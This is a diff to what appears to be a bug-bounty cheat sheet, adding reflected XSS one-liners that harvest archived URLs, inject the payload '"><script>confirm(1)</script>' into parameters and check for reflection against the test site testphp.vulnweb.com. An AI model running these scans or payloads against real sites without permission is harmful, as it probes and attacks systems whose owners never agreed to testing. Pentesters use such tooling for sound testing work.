@@ -39,7 +39,12 @@ cat waybackurls-urls.txt gau-urls.txt | anew -q urls.txt
 cat urls.txt | uro | gf allparam | grep "=" | gf blacklist | qsreplace '"><script>confirm(1)</script>' | xsschecker -match '"><script>confirm(1)</script>'
 ```
 
-## Reflected XSS Oneliner
+## Reflected XSS Oneliner Command1
 ```
-echo "testphp.vulnweb.com" | waybackurls | gf xss | uro | qsreplace '"><script>confirm(1)</script>' | xsschecker -match '"><script>confirm(1)</script>'
+echo "testphp.vulnweb.com" | waybackurls | gf xss | uro | qsreplace '"><script>confirm(1)</script>' | xsschecker -match '"><script>confirm(1)</script>' -vuln
+```
+
+## Reflected XSS Oneliner Command2
+```
+echo "testphp.vulnweb.com" | waybackurls | uro | gf allparam | grep "=" | gf blacklist | qsreplace '"><script>confirm(1)</script>' | go run xsschecker.go -match '"><script>confirm(1)</script>' -vuln
 ```
